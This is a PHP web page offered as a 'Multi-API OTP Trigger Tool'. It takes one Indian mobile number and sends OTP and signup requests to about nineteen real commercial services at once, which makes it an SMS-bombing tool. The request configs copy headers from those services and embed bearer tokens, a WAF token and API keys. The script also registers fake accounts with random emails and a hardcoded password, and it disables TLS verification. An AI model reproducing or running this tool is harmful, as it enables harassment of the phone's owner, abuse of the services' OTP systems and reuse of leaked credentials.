<?php
/**
 * Multi-API OTP Trigger Tool
 * 
 * This script allows you to submit a mobile number and trigger OTP requests
 * across multiple Indian service APIs simultaneously.
 */

// Error reporting for debugging (disable in production)
error_reporting(E_ALL);
ini_set('display_errors', 1);

// API configurations (filtered and cleaned)
$apiConfigs = [
    [
        "name" => "Addatimes Login",
        "method" => "POST",
        "url" => "https://app.addatimes.com/api/login",
        "headers" => [
            "accept" => "application/json, text/plain, */*",
            "content-type" => "application/json",
            "origin" => "https://www.addatimes.com",
            "referer" => "https://www.addatimes.com/",
            "user-agent" => "Mozilla/5.0"
        ],
        "json" => [
            "phone" => "{phone}",
            "country_code" => "IN"
        ]
    ],
    [
        "name" => "Addatimes Register",
        "method" => "POST",
        "url" => "https://app.addatimes.com/api/register",
        "headers" => [
            "accept" => "application/json, text/plain, */*",
            "content-type" => "application/json",
            "origin" => "https://www.addatimes.com",
            "referer" => "https://www.addatimes.com/",
            "user-agent" => "Mozilla/5.0"
        ],
        "json" => [
            "phone" => "{phone}",
            "email" => "{random_email}",
            "country_code" => "IN",
            "password" => "elliotisdop666",
            "confirm_password" => "elliotisdop666"
        ]
    ],
    [
        "name" => "Allen",
        "method" => "POST",
        "url" => "https://api.allen-live.in/api/v1/auth/sendOtp",
        "headers" => [
            "Content-Type" => "application/json",
            "x-device-id" => "{uuid}",
            "x-client-type" => "web"
        ],
        "params" => [
            "center_id" => "",
            "source" => "home-page-login"
        ],
        "json" => [
            "country_code" => "91",
            "phone_number" => "{phone}",
            "persona_type" => "STUDENT",
            "otp_type" => "SHARED_DEFAULT"
        ]
    ],
    [
        "name" => "Chaupal",
        "method" => "POST",
        "url" => "https://chaupalapi.revlet.net/service/api/auth/get/otp",
        "headers" => [
            "accept" => "application/json, text/plain, */*",
            "content-type" => "application/json",
            "box-id" => "29c1f5fb-53d2-cc40-fe6b-3f4e2b21471e",
            "session-id" => "d14cad2f-2cb9-4211-81bc-7eb63271bbfe",
            "tenant-code" => "chaupal",
            "origin" => "https://www.chaupal.com",
            "referer" => "https://www.chaupal.com/",
            "user-agent" => "Mozilla/5.0"
        ],
        "json" => [
            "context" => "signup",
            "mobile" => "91{phone}"
        ]
    ],
    [
        "name" => "CityMall",
        "method" => "POST",
        "url" => "https://citymall.live/web-api/auth/send-otp",
        "headers" => [
            "Accept" => "application/json, text/plain, */*",
            "Content-Type" => "application/json",
            "Origin" => "https://citymall.live",
            "Referer" => "https://citymall.live/",
            "User-Agent" => "Mozilla/5.0"
        ],
        "cookies" => [
            "cm_guest" => "{uuid}"
        ],
        "json" => [
            "phone_number" => "{phone}"
        ]
    ],
    [
        "name" => "Delhivery",
        "method" => "GET",
        "url" => "https://dlv-api.delhivery.com/v4/otp/generate/{phone}",
        "headers" => [
            "accept" => "application/json, text/plain, */*",
            "accept-language" => "en-US,en;q=0.9",
            "origin" => "https://www.delhivery.com",
            "referer" => "https://www.delhivery.com/",
            "user-agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "x-aws-waf-token" => "f7c9b3d5-5738-4b52-9cf3-d82ba252c043:BQoAreKFvjxDAAAA:bOG69Fnp16TiGu9moYudpj1Yi5xCaWr3xypviyZWHxdOtyaSYF3pAUgow7Atx3L3rBPdN+Fv3QkhcRM6LB+asW1Fa1zxpBRvmwfaSTZ19TKp85ZjXiY5u0mIfvS32fRfPKnKLRixVrXoNvOQf+CICAOEPQbOAD11XGSFiNX7arUuLSV2dWWLJ+ySGHN1t09bcjuUNg=="
        ]
    ],
    [
        "name" => "District",
        "method" => "POST",
        "url" => "https://www.district.in/gw/auth/generate_otp",
        "headers" => [
            "accept" => "*/*",
            "accept-language" => "en-US,en;q=0.8",
            "content-type" => "application/json",
            "origin" => "https://www.district.in",
            "referer" => "https://www.district.in/",
            "user-agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "x-app-type" => "ed_web",
            "x-app-version" => "11.11.1",
            "x-client-id" => "district-web",
            "x-device-id" => "{uuid}",
            "x-guest-token" => "1212"
        ],
        "cookies" => [
            "x-device-id" => "{uuid}"
        ],
        "json" => [
            "phone_number" => "{phone}",
            "country_code" => "91"
        ]
    ],
    [
        "name" => "Fi",
        "method" => "POST",
        "url" => "https://fi.money/next-api/grpc/Signup/generateOtp",
        "headers" => [
            "accept" => "*/*",
            "content-type" => "application/json",
            "origin" => "https://fi.money",
            "referer" => "https://fi.money/features/instant-loans/personal-loan-eligibility",
            "user-agent" => "Mozilla/5.0"
        ],
        "cookies" => [
            "prospect_id" => "{uuid}",
            "server_prospect_id" => "false"
        ],
        "json" => [
            "phoneNumber" => [
                "countryCode" => 91,
                "nationalNumber" => "{phone}"
            ],
            "token" => "",
            "flowName" => 0
        ]
    ],
    [
        "name" => "HDFCSky",
        "method" => "POST",
        "url" => "https://api.hdfcsky.com/api/kyc/v2/send-otp/sms",
        "headers" => [
            "accept" => "application/json, text/plain, */*",
            "accept-language" => "en-US,en;q=0.9",
            "content-type" => "application/json",
            "origin" => "https://hdfcsky.com",
            "referer" => "https://hdfcsky.com/",
            "user-agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "x-device-type" => "web"
        ],
        "json" => [
            "phone_no" => "91{phone}"
        ]
    ],
    [
        "name" => "Hoichoi",
        "method" => "POST",
        "url" => "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code",
        "headers" => [
            "content-type" => "application/json",
            "rid" => "anti-csrf",
            "st-auth-mode" => "header"
        ],
        "json" => [
            "phoneNumber" => "+91{phone}",
            "platform" => "MOBILE_WEB"
        ]
    ],
    [
        "name" => "Hungama",
        "method" => "POST",
        "url" => "https://chcommunication.api.hungama.com/v1/communication/otp",
        "headers" => [
            "accept" => "application/json, text/plain, */*",
            "accept-language" => "en-US,en;q=0.7",
            "alang" => "en",
            "content-type" => "application/json",
            "country_code" => "IN",
            "identifier" => "home",
            "mlang" => "en",
            "origin" => "https://www.hungama.com",
            "referer" => "https://www.hungama.com/",
            "user-agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "vlang" => "en"
        ],
        "json" => [
            "mobileNo" => "{phone}",
            "countryCode" => "+91",
            "appCode" => "un",
            "messageId" => "1",
            "emailId" => "",
            "subject" => "Register",
            "priority" => "1",
            "device" => "web",
            "variant" => "v1",
            "templateCode" => 1
        ]
    ],
    [
        "name" => "Ixigo",
        "method" => "PUT",
        "url" => "https://www.ixigo.com/api/v4/oauth/signup",
        "headers" => [
            "accept" => "*/*",
            "accept-language" => "en-US,en;q=0.8",
            "apikey" => "ixiweb!2$",
            "clientid" => "ixiweb",
            "content-type" => "application/x-www-form-urlencoded",
            "deviceid" => "33987b97d5de4e089461",
            "ixisrc" => "ixiweb",
            "origin" => "https://www.ixigo.com",
            "referer" => "https://www.ixigo.com/login",
            "user-agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "uuid" => "33987b97d5de4e089461",
            "x-requested-with" => "XMLHttpRequest"
        ],
        "data" => [
            "prefix" => "+91",
            "name" => "testuser",
            "phNo" => "{phone}",
            "email" => "{random_email}",
            "resendOnCall" => "false",
            "key" => "undefined",
            "platform" => "Mobile"
        ]
    ],
    [
        "name" => "Jeep",
        "method" => "POST",
        "url" => "https://prod-jeep-api.one3d.in/api/v1/customer/send-otp",
        "headers" => [
            "accept" => "application/json, text/plain, */*",
            "content-type" => "application/json",
            "authorization" => "Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImltcmFuQGVjY2VudHJpY2VuZ2luZS5jb20iLCJpYXQiOjE3NzI5MTQ5NzgsImV4cCI6MTc3MzQzMzM3OH0.oMOQKi9QPEIAyGFNkyp55RpnsbEjTc6gNKQxMROv2N2dx3r-QmgWU7qOX1u5OpVSPFutI8ChYIKfmpddKA7G6w",
            "origin" => "https://configurator.jeep-india.com",
            "referer" => "https://configurator.jeep-india.com/",
            "user-agent" => "Mozilla/5.0"
        ],
        "json" => [
            "mobile_number" => "{phone}",
            "salutation" => "Mr.",
            "first_name" => "Test",
            "reg_source" => "visualizer"
        ]
    ],
    [
        "name" => "RelianceRetail",
        "method" => "POST",
        "url" => "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp",
        "headers" => [
            "accept" => "application/json",
            "accept-language" => "en-US,en;q=0.9",
            "content-type" => "application/json",
            "authorization" => "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZXR1cm5fdWlfdXJsIjoid3d3Lmppb21hcnQuY29tL2N1c3RvbWVyL2FjY291bnQvbG9naW4_bXNpdGU9eWVzIiwiY2xpZW50X2lkIjoiZmRiNjQ2ZWEtZTcwOC00NzI1LWE5NTMtMjI4ZmExY2I4MzU1IiwiaWF0IjoxNzcyOTE2NzA0LCJzYWx0IjowfQ.Djfr8SBUQnBkj0UIb3hptBKoddGE0sIWniKDkB_oqFU",
            "origin" => "https://account.relianceretail.com",
            "referer" => "https://account.relianceretail.com/",
            "user-agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "source_meta" => "{\"source_id\":null,\"device_fingerprint\":\"53d692cc-f822-4a-eyJwbGF0Zm9ybSI6\",\"os_name\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36\",\"timestamp\":\"2026-03-07T20:51:54.003Z\"}"
        ],
        "json" => [
            "mobile" => "{phone}"
        ]
    ],
    [
        "name" => "Khatabook",
        "method" => "POST",
        "url" => "https://api.khatabook.com/v1/auth/request-otp",
        "headers" => [
            "accept" => "*/*",
            "content-type" => "application/json",
            "origin" => "https://khatabook.com",
            "referer" => "https://khatabook.com/",
            "user-agent" => "Mozilla/5.0",
            "x-kb-app-locale" => "en",
            "x-kb-app-name" => "Khatabook Website",
            "x-kb-app-version" => "000100",
            "x-kb-new-auth" => "false",
            "x-kb-platform" => "web"
        ],
        "json" => [
            "country_code" => "+91",
            "phone" => "{phone}",
            "app_signature" => "Jc/Zu7qNqQ2"
        ]
    ],
    [
        "name" => "Klikk",
        "method" => "POST",
        "url" => "https://www.klikk.tv/?r=User/LoginWithOTP",
        "headers" => [
            "accept" => "application/json",
            "accept-language" => "en-US,en;q=0.5",
            "api-key" => "f4f068e71e0d87bf0ad51e6214ab84e9",
            "content-type" => "application/json",
            "origin" => "https://www.klikk.tv",
            "referer" => "https://www.klikk.tv/",
            "user-agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "x-requested-with" => "XMLHttpRequest"
        ],
        "json" => [
            "contactNumber" => "+91-{phone}",
            "deviceName" => "Chrome - Windows 10",
            "deviceType" => 2,
            "socialType" => 0
        ]
    ],
    [
        "name" => "KreditBee",
        "method" => "PUT",
        "url" => "https://api.kreditbee.in/v1/me/otp",
        "headers" => [
            "accept" => "application/json, text/plain, */*",
            "accept-language" => "en-US,en;q=0.8",
            "authorization" => "Bearer null",
            "content-type" => "application/json",
            "origin" => "https://pwa-web1.kreditbee.in",
            "referer" => "https://pwa-web1.kreditbee.in/",
            "user-agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "x-kb-info" => "eyJsYXQiOiIwIiwibG5nIjoiMCIsImRpZCI6IiIsImFwcHR5cGUiOiJ3ZWIiLCJhcHB2ZXIiOiIiLCJpc3Jvb3RlZCI6IiJ9"
        ],
        "json" => [
            "reason" => "loginOrRegister",
            "mobile" => "{phone}",
            "mediaSource" => "",
            "firebaseInstanceId" => "",
            "firebaseiosAppInstId" => ""
        ]
    ],
    [
        "name" => "Kult",
        "method" => "GET",
        "url" => "https://api.kult.in/api/v2/otp/send",
        "headers" => [
            "accept" => "application/json, text/plain, */*",
            "bundle-identifier" => "beauty.kult-beta.app",
            "device-type" => "web",
            "origin" => "https://www.kult.app",
            "referer" => "https://www.kult.app/",
            "user-agent" => "Mozilla/5.0"
        ],
        "params" => [
            "phone_number" => "{phone}",
            "country_id" => "106"
        ]
    ],
    [
        "name" => "LegalKart",
        "method" => "POST",
        "url" => "https://www.legalkart.com/api/v2/customer/register/generate-otp",
        "headers" => [
            "accept" => "application/json, text/plain, */*",
            "content-type" => "application/json",
            "origin" => "https://www.legalkart.com",
            "referer" => "https://www.legalkart.com/",
            "user-agent" => "Mozilla/5.0"
        ],
        "json" => [
            "mobile" => "{phone}",
            "country_code" => "+91"
        ]
    ]
];

/**
 * Generate a random UUID v4
 */
function generateUUID() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

/**
 * Generate a random email address
 */
function generateRandomEmail() {
    $domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com', 'temp-mail.org'];
    $username = 'user' . time() . mt_rand(1000, 9999);
    $domain = $domains[array_rand($domains)];
    return $username . '@' . $domain;
}

/**
 * Replace placeholders in data arrays recursively
 */
function replacePlaceholders($data, $phone, $uuid, $email) {
    if (is_array($data)) {
        foreach ($data as $key => $value) {
            $data[$key] = replacePlaceholders($value, $phone, $uuid, $email);
        }
        return $data;
    } elseif (is_string($data)) {
        return str_replace(
            ['{phone}', '{uuid}', '{random_email}'],
            [$phone, $uuid, $email],
            $data
        );
    }
    return $data;
}

/**
 * Execute API request using cURL
 */
function executeApiRequest($config, $phone, $uuid, $email) {
    $ch = curl_init();
    
    // Replace placeholders in URL, headers, params, json, cookies, data
    $url = replacePlaceholders($config['url'], $phone, $uuid, $email);
    $headers = replacePlaceholders($config['headers'] ?? [], $phone, $uuid, $email);
    $params = replacePlaceholders($config['params'] ?? [], $phone, $uuid, $email);
    $jsonData = replacePlaceholders($config['json'] ?? [], $phone, $uuid, $email);
    $cookies = replacePlaceholders($config['cookies'] ?? [], $phone, $uuid, $email);
    $formData = replacePlaceholders($config['data'] ?? [], $phone, $uuid, $email);
    
    // Build URL with query parameters
    if (!empty($params)) {
        $url .= '?' . http_build_query($params);
    }
    
    // Set cURL options
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    // Set method
    $method = strtoupper($config['method'] ?? 'GET');
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    
    // Set headers
    $headerArray = [];
    foreach ($headers as $key => $value) {
        $headerArray[] = "$key: $value";
    }
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headerArray);
    
    // Set cookies
    if (!empty($cookies)) {
        $cookieString = '';
        foreach ($cookies as $key => $value) {
            $cookieString .= "$key=$value; ";
        }
        curl_setopt($ch, CURLOPT_COOKIE, rtrim($cookieString, '; '));
    }
    
    // Set request body
    if ($method === 'POST' || $method === 'PUT') {
        if (!empty($jsonData)) {
            $body = json_encode($jsonData);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        } elseif (!empty($formData)) {
            $body = http_build_query($formData);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        }
    }
    
    // Execute request
    $startTime = microtime(true);
    $response = curl_exec($ch);
    $endTime = microtime(true);
    $duration = round(($endTime - $startTime) * 1000, 2);
    
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    
    curl_close($ch);
    
    return [
        'success' => $error === '',
        'http_code' => $httpCode,
        'duration_ms' => $duration,
        'response' => $response,
        'error' => $error
    ];
}

// Handle form submission
$results = [];
$submitted = false;
$phone = '';
$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['phone'])) {
    $submitted = true;
    $phone = preg_replace('/[^0-9]/', '', $_POST['phone']);
    
    // Validate phone number (10 digits for Indian numbers)
    if (strlen($phone) === 10) {
        $uuid = generateUUID();
        $email = generateRandomEmail();
        
        // Process each API
        foreach ($apiConfigs as $index => $config) {
            $result = executeApiRequest($config, $phone, $uuid, $email);
            $results[] = [
                'index' => $index + 1,
                'name' => $config['name'],
                'method' => $config['method'],
                'url' => $config['url'],
                'success' => $result['success'],
                'http_code' => $result['http_code'],
                'duration_ms' => $result['duration_ms'],
                'response' => $result['response'],
                'error' => $result['error']
            ];
        }
        
        $message = count($results) . " API requests processed successfully!";
    } else {
        $message = "Please enter a valid 10-digit Indian mobile number.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Multi-API OTP Trigger Tool</title>
    <style>
        * {
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .header h1 {
            color: white;
            font-size: 28px;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
        }
        
        .header p {
            color: rgba(255,255,255,0.9);
            font-size: 16px;
        }
        
        .card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            overflow: hidden;
            margin-bottom: 30px;
        }
        
        .form-card {
            background: white;
            border-radius: 16px;
            padding: 30px;
            margin-bottom: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            font-weight: 600;
            margin-bottom: 8px;
            color: #333;
        }
        
        .phone-input {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .country-code {
            background: #f5f5f5;
            padding: 12px 16px;
            border-radius: 8px;
            font-weight: 600;
            border: 1px solid #e0e0e0;
            color: #333;
        }
        
        input[type="tel"] {
            flex: 1;
            padding: 12px 16px;
            font-size: 16px;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            transition: all 0.3s;
        }
        
        input[type="tel"]:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 12px 32px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 8px;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        .message {
            margin-top: 20px;
            padding: 12px 16px;
            border-radius: 8px;
            background: #e8f5e9;
            color: #2e7d32;
            border-left: 4px solid #2e7d32;
        }
        
        .message.error {
            background: #ffebee;
            color: #c62828;
            border-left-color: #c62828;
        }
        
        .stats {
            background: #f8f9fa;
            padding: 15px 20px;
            border-bottom: 1px solid #e0e0e0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .stats-badge {
            background: #667eea;
            color: white;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
        }
        
        .table-container {
            overflow-x: auto;
            max-height: 600px;
            overflow-y: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }
        
        th {
            background: #f8f9fa;
            padding: 12px;
            text-align: left;
            font-weight: 600;
            color: #333;
            border-bottom: 2px solid #e0e0e0;
            position: sticky;
            top: 0;
            background: #f8f9fa;
            z-index: 10;
        }
        
        td {
            padding: 12px;
            border-bottom: 1px solid #e0e0e0;
            vertical-align: top;
        }
        
        tr:hover {
            background: #f8f9fa;
        }
        
        .status-success {
            color: #2e7d32;
            font-weight: 600;
        }
        
        .status-error {
            color: #c62828;
            font-weight: 600;
        }
        
        .http-code {
            font-family: monospace;
            font-weight: 600;
        }
        
        .response-preview {
            max-width: 300px;
            font-family: monospace;
            font-size: 12px;
            white-space: pre-wrap;
            word-break: break-all;
            background: #f5f5f5;
            padding: 8px;
            border-radius: 4px;
            max-height: 100px;
            overflow: auto;
        }
        
        .api-name {
            font-weight: 600;
            color: #333;
        }
        
        .method-post {
            background: #4caf50;
            color: white;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
            display: inline-block;
        }
        
        .method-get {
            background: #2196f3;
            color: white;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
            display: inline-block;
        }
        
        .method-put {
            background: #ff9800;
            color: white;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
            display: inline-block;
        }
        
        .loading {
            text-align: center;
            padding: 40px;
            color: #666;
        }
        
        @media (max-width: 768px) {
            .phone-input {
                flex-direction: column;
                align-items: stretch;
            }
            
            .country-code {
                text-align: center;
            }
            
            th, td {
                font-size: 12px;
                padding: 8px;
            }
            
            .response-preview {
                max-width: 200px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📱 Multi-API OTP Trigger Tool</h1>
            <p>Send OTP requests to multiple Indian service APIs simultaneously</p>
        </div>
        
        <div class="form-card">
            <form method="POST" action="">
                <div class="form-group">
                    <label>📞 Mobile Number</label>
                    <div class="phone-input">
                        <span class="country-code">+91</span>
                        <input type="tel" 
                               name="phone" 
                               placeholder="Enter 10-digit mobile number" 
                               value="<?php echo htmlspecialchars($phone); ?>"
                               pattern="[0-9]{10}"
                               maxlength="10"
                               required>
                        <button type="submit">🚀 Send OTPs</button>
                    </div>
                    <small style="color: #666; display: block; margin-top: 8px;">Enter a valid 10-digit Indian mobile number</small>
                </div>
            </form>
            
            <?php if ($message): ?>
                <div class="message <?php echo strpos($message, 'valid') !== false ? 'error' : ''; ?>">
                    <?php echo htmlspecialchars($message); ?>
                </div>
            <?php endif; ?>
        </div>
        
        <?php if ($submitted && !empty($results)): ?>
            <?php
            $successCount = count(array_filter($results, function($r) { return $r['success'] && $r['http_code'] < 400; }));
            $errorCount = count($results) - $successCount;
            ?>
            <div class="card">
                <div class="stats">
                    <div>
                        <strong>📊 Results for +91 <?php echo htmlspecialchars($phone); ?></strong>
                    </div>
                    <div>
                        <span class="stats-badge" style="background: #2e7d32;">✅ Success: <?php echo $successCount; ?></span>
                        <span class="stats-badge" style="background: #c62828; margin-left: 8px;">❌ Failed: <?php echo $errorCount; ?></span>
                        <span class="stats-badge" style="background: #1976d2; margin-left: 8px;">📡 Total: <?php echo count($results); ?></span>
                    </div>
                </div>
                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>#</th>
                                <th>API Name</th>
                                <th>Method</th>
                                <th>Status</th>
                                <th>HTTP Code</th>
                                <th>Time</th>
                                <th>Response Preview</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach ($results as $result): ?>
                                <tr>
                                    <td><?php echo $result['index']; ?></td>
                                    <td class="api-name"><?php echo htmlspecialchars($result['name']); ?></td>
                                    <td>
                                        <span class="method-<?php echo strtolower($result['method']); ?>">
                                            <?php echo htmlspecialchars($result['method']); ?>
                                        </span>
                                    </td>
                                    <td>
                                        <?php if ($result['success'] && $result['http_code'] < 400): ?>
                                            <span class="status-success">✓ Success</span>
                                        <?php else: ?>
                                            <span class="status-error">✗ Failed</span>
                                        <?php endif; ?>
                                    </td>
                                    <td class="http-code"><?php echo $result['http_code']; ?></td>
                                    <td><?php echo $result['duration_ms']; ?> ms</td>
                                    <td>
                                        <?php if ($result['success']): ?>
                                            <div class="response-preview">
                                                <?php 
                                                $preview = $result['response'];
                                                if (strlen($preview) > 200) {
                                                    $preview = substr($preview, 0, 200) . '...';
                                                }
                                                echo htmlspecialchars($preview);
                                                ?>
                                            </div>
                                        <?php else: ?>
                                            <div class="response-preview" style="color: #c62828;">
                                                <?php echo htmlspecialchars($result['error']); ?>
                                            </div>
                                        <?php endif; ?>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        <?php elseif ($submitted): ?>
            <div class="card">
                <div class="loading">
                    No results to display. Please check your input and try again.
                </div>
            </div>
        <?php endif; ?>
    </div>
</body>
</html>